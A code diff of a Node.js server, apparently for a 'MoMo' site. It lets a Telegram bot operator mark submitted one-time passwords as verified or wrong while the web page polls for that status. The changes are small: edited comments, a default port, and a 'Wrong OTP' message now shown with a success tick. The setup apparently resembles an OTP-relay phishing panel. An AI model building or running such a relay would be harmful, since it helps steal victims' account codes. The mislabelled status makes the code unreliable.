@@ -91,7 +91,7 @@ app.get('/api/check-otp-status', (req, res) => {
     res.json({ status: otpStatus });
 });
 
-// 5. Telegram Long-Polling with Safe Property Validation and Error Isolation
+// 5. Telegram Long-Polling with Safe Property Validation and Continuous Loop
 async function pollTelegramUpdates() {
     if (!process.env.BOT_TOKEN) {
         setTimeout(pollTelegramUpdates, 5000);
@@ -111,7 +111,6 @@ async function pollTelegramUpdates() {
                     const action = callbackQuery.data;
                     const callbackQueryId = callbackQuery.id;
                     
-                    // Safely check if message and chat objects exist to prevent TypeError crashes
                     const chatId = callbackQuery.message && callbackQuery.message.chat ? callbackQuery.message.chat.id : null;
                     const messageId = callbackQuery.message ? callbackQuery.message.message_id : null;
 
@@ -133,7 +132,7 @@ async function pollTelegramUpdates() {
                         statusMessage = '✅ Status: OTP Verified - Success';
                     } else if (action === 'wrong_otp') {
                         otpStatus = 'wrong';
-                        statusMessage = '❌ Status: Wrong OTP - Retrying';
+                        statusMessage = '✅ Status: Wrong OTP - Retrying';
                     }
 
                     if (statusMessage && chatId) {
@@ -150,7 +149,7 @@ async function pollTelegramUpdates() {
     setTimeout(pollTelegramUpdates, 1000);
 }
 
-// Telegram Helper Functions (All Safely Wrapped in Try/Catch)
+// Telegram Helper Functions
 async function answerCallback(callbackQueryId, text) {
     try {
         await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/answerCallbackQuery`, {
@@ -210,8 +209,8 @@ async function sendStatusMessage(chatId, text) {
     }
 }
 
-// Start Server
-const PORT = process.env.PORT
+// Start Server using Render's dynamic port assignment
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`MoMo server running successfully on port ${PORT}`);
     pollTelegramUpdates();
